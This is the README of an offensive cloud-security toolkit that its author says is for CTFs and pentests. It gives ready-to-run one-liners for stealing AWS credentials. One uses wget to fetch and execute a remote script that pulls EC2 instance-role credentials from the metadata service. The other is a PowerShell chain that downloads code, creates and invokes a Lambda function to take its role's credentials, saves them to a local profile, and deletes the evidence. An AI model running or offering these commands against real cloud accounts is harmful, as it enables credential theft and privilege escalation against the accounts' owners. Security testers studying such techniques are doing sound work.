# moratti-cloud-toolkit

This is a collection of scripts to help me on cloud CTFs and pentests. 


### EC2 IMDSv2 Credential Stealer one-liner

`wget https://raw.githubusercontent.com/lmoratti/moratti-cloud-toolkit/main/main.py && python main.py`

I designed this script to work with Amazon Linux 2 default python libraries. This means its unfortunately a Python2 script because by default Python3 does not have requests imported.

There is a corresponding blog post on my medium blog here if you're interested:
https://medium.com/@morattisec

Example output:
```
 ********************************************************************** 

Attempting to exfiltrate EC2 instance role credentials.
   Attempting to PUT request to metadata endpoint to obtain token for subsequent requests.
        [SUCCESS]
   Enumerating role name for the EC2 instance profile.
        [SUCCESS]
   Making final request for credentials
        [SUCCESS]

These credentials expire after 6 hours. You can copy and paste this blob into ~/.aws/credentials to quickly make a profile from your host machine.

[AdministratorEc2]
aws_access_key_id = ASIAfakekeyhere
aws_secret_access_key = examplesecretkey
aws_session_token = actual_value_here

**One-liners to use on a different host to add this key as an AWS CLI profile **

 LINUX ONE-LINER:

echo -e "BIGBLOBOFBASE64HERE" | base64 -d >> ~/.aws/credentials 

 POWERSHELL ONE-LINER:

$ENCODED = "BIGBLOBOFBASE64HERE";$DECODED=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ENCODED));Add-Content $env:USERPROFILE\.aws\credentials $DECODED;$ENCODED="";$DECODED="";

Run this AWS CLI command to see if your profile works and if the name of the credentials is accurate.
aws --profile AdministratorEc2 sts get-caller-identity
```
### Lambda Invoke Function and Steal Credentials


This one liner needs to be slightly modified to have you will need to edit $AWS_CLI_PROFILE_NAME and $ROLE_ARN

It will:
1. Pull down index.py code
2. Zip index.py code
3. Create a lambda function with the role and code 
4. Invoke that function that steals the credentials
5. Take the credentials and add them to your ~/.aws/credentials file
6. Delete index.py, index.zip, output.txt (lambda's output) files
7. Delete the function we create/invoked.
8. Call sts get-caller-identity with the newly configured "lambda-credentials-exfil"

Power shell one-liner:
```
$ROLE_ARN="arn:REPLACEME";$AWS_CLI_PROFILE_NAME="REPLACME";Invoke-WebRequest -Uri "https://raw.githubusercontent.com/lmoratti/moratti-cloud-toolkit/main/index.py" -OutFile "index.py";echo "--profle $AWS_CLI_PROFILE_NAME";echo "Role Arn is set to $ROLE_ARN";echo "zipping the index.py";Compress-Archive -LiteralPath .\index.py -DestinationPath .\index.zip -Force;echo "Creating a lambda function with $ROLE_ARN attached. You might need to press enter a few times if you have lots of functions to scroll through.";Start-Sleep -Seconds 5;aws --profile "$AWS_CLI_PROFILE_NAME" lambda create-function --function-name lambda-credentials --role $ROLE_ARN --zip-file fileb://.\index.zip  --handler index.lambda_handler --runtime python3.9;Echo "Sleep for 10s. Press control + c if you got an error on create.";Start-Sleep -Seconds 5;echo "Invoking Function...";aws --profile "$AWS_CLI_PROFILE_NAME" lambda invoke --function-name lambda-credentials output.txt;Echo "Adding the credentials to your ~/.aws/credentials file";$EncodedCreds=`Get-Content output.txt;$DecodedCreds=[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedCreds));Add-Content $env:USERPROFILE\.aws\credentials "$DecodedCreds"; $DecodedCreds="";$EncodedCreds="";del output.txt;$ROLE_ARN="";echo "Check your ~/.aws/credentials file to ensure the profile was added and there's no duplicates.";echo "Deleting the lambda function";aws --profile $AWS_CLI_PROFILE_NAME lambda delete-function --function-name lambda-credentials;del index.py; del index.zip;$AWS_CLI_PROFILE_NAME="";aws --profile lambda-credentials-exfil sts get-caller-identity;
```

Linux one-liner
```
TBD.
```